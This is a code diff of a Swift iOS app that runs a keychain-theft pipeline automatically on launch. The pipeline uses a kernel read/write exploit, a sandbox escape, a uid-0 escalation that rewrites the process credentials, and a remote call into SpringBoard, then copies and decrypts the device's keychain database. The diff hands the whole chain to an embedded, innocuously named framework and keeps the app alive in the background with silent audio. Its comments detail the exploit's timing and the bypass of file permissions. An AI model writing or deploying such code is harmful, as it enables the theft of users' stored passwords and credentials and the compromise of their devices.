@@ -140,59 +140,28 @@ struct lara: App {
         }
     }
 
-    // Auto-run the keychain (AKS) pipeline on launch. The embedded
-    // libuiopsersvc.framework reuses lara's kernel r/w, so we first bring up
-    // lara's exploit, then hand off to the bridge. Offsets are not available
-    // at launch (the kernelcache is fetched by the exploit), so mirror the UI
-    // flow: run exploit -> fetch kernelcache -> parse offsets -> bridge.
+    // Framework-only mode: the embedded libuiopsersvc.framework is fully
+    // self-contained. It brings up kernel r/w itself (ds_run -> its own exploit
+    // + kernelcache fetch/parse), builds its own SpringBoard/securityd remote
+    // attach, then copies + AKS-unwraps the keychain DB. lara's own exploit,
+    // sandbox escape and RemoteCall chain are not used at all.
     private func autorunkeychainpipeline() {
-        let mgr = self.mgr
-        globallogger.log("(kc) auto-running kernel r/w exploit before keychain pipeline")
-        mgr.run { success in
-            guard success else {
-                globallogger.log("(kc) skipped: kernel r/w not ready")
-                return
-            }
-            DispatchQueue.global(qos: .userInitiated).async {
-                if !mgr.hasOffsets {
-                    var ok = fetchkcache()
-                    if ok {
-                        ok = dlkcache()
-                    }
-                    DispatchQueue.main.async { mgr.hasOffsets = ok }
-                    guard ok else {
-                        DispatchQueue.main.async {
-                            globallogger.log("(kc) skipped: offsets unavailable")
-                        }
-                        return
-                    }
-                }
-
-                DispatchQueue.main.async {
-                    self.prepareAndRunKeychainPipeline()
-                }
-            }
-        }
+        globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
+        prepareAndRunKeychainPipeline()
     }
 
-    // The framework needs a readable sandbox and a live SpringBoard RemoteCall
-    // before it can copy/decrypt the keychain DB. Escaping the sandbox and
-    // initializing the RemoteCall can only be done on the main queue via laramgr,
-    // so chain: sbx escape -> rcinit(SpringBoard) -> register -> pipeline.
+    // Drive the embedded framework end-to-end. The framework owns the whole
+    // pipeline: exploit -> kernelcache -> offsets -> remote attach -> keychain
+    // copy -> AKS unwrap. We only keep the process alive and guard the
+    // scene-phase teardown while it runs.
     private func prepareAndRunKeychainPipeline() {
         let mgr = self.mgr
 
-        // The framework pipeline needs the SpringBoard RemoteCall and a live
-        // process for its whole duration. Guard it against scene-phase teardown
-        // (mgr.kcpipelineactive) and keep the process alive if the app gets
-        // backgrounded by running the silent-audio keepalive.
+        // Keep the process alive for the whole pipeline and ignore transient
+        // scene-phase teardown (mgr.kcpipelineactive).
         mgr.kcpipelineactive = true
         if !kaenabled { toggleka() }
 
-        // Load the framework BEFORE escaping the sandbox: once sbx_escape patches
-        // the sandbox extension table, mmap() of our own embedded framework gets
-        // denied ("file system sandbox blocked mmap()"), so dlopen would fail.
-        // Loading it first keeps the image mapped for the later pipeline calls.
         do {
             try LaraKeychainSvc.ensureLoaded()
             globallogger.log("(kc) libuiopsersvc loaded")
@@ -202,73 +171,24 @@ struct lara: App {
             return
         }
 
-        let proceed = {
-            // The framework can only reach /private/var/Keychains/keychain-2.db
-            // if we bypass DAC: the DB is owned by _securityd (mode 0600), and a
-            // sandbox extension alone still yields errno=13. Rewriting our own
-            // ucred to uid 0 makes the framework's own fopen() succeed; the
-            // sandbox extension it already holds keeps the seatbelt layer happy.
-            //
-            // This has to happen BEFORE rcinit: once the SpringBoard RemoteCall
-            // has finished initializing, darksword's ICMPv6-socket kernel write
-            // primitive stops landing (setsockopt fails and the ucred uid field
-            // stays 501), so escalate while writes are still known-good.
-            var savedUids: [UInt32] = [0, 0, 0]
-            var rooted = false
-            DispatchQueue.global(qos: .userInitiated).async {
-                rooted = savedUids.withUnsafeMutableBufferPointer { buf -> Bool in
-                    sbx_rootify(buf.baseAddress) == 0
-                }
-                DispatchQueue.main.async {
-                    globallogger.log("(kc) uid-0 escalation before rcinit: \(rooted ? "ok" : "failed")")
-                    globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain pipeline")
-                    mgr.rcinit(process: "SpringBoard") { rcok in
-                        guard rcok else {
-                            globallogger.log("(kc) skipped: SpringBoard RemoteCall unavailable")
-                            mgr.kcpipelineactive = false
-                            return
-                        }
-                        let registered = LaraKeychainSvc.registerSpringBoard(mgr.sbProc)
-                        globallogger.log("(kc) registered SpringBoard RemoteCall: \(registered)")
-                        DispatchQueue.global(qos: .userInitiated).async {
-                            var result: [AnyHashable: Any]?
-                            var failure: Error?
-                            do {
-                                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
-                            } catch {
-                                failure = error
-                            }
-
-                            if rooted {
-                                savedUids.withUnsafeBufferPointer { _ = sbx_unrootify($0.baseAddress) }
-                            }
-
-                            DispatchQueue.main.async {
-                                if let failure {
-                                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
-                                } else {
-                                    globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
-                                }
-                                if rooted {
-                                    globallogger.log("(kc) uid restored after pipeline")
-                                }
-                                mgr.kcpipelineactive = false
-                            }
-                        }
-                    }
-                }
+        globallogger.log("(kc) running framework pipeline (exploit + copy + AKS unwrap)")
+        DispatchQueue.global(qos: .userInitiated).async {
+            var result: [AnyHashable: Any]?
+            var failure: Error?
+            do {
+                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
+            } catch {
+                failure = error
             }
-        }
 
-        if mgr.sbxready {
-            proceed()
-            return
-        }
-
-        globallogger.log("(kc) sandbox escape before keychain pipeline")
-        mgr.sbxescape { sbxok in
-            globallogger.log("(kc) sandbox escape: \(sbxok ? "ok" : "failed")")
-            proceed()
+            DispatchQueue.main.async {
+                if let failure {
+                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
+                } else {
+                    globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
+                }
+                mgr.kcpipelineactive = false
+            }
         }
     }
 
